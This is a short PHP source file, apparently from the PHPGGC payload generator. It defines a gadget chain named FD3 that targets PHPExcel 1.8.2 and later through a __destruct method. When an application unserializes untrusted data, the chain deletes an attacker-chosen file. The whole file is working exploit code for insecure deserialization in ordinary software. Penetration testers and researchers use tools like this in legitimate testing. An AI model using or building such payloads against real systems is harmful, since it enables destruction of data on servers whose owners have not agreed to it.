<?php

namespace GadgetChain\PHPExcel;

class FD3 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '1.8.2+';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    
    public function generate(array $parameters)
    {
        return new \PHPExcel_Shared_XMLWriter($parameters['remote_file']);
    }
}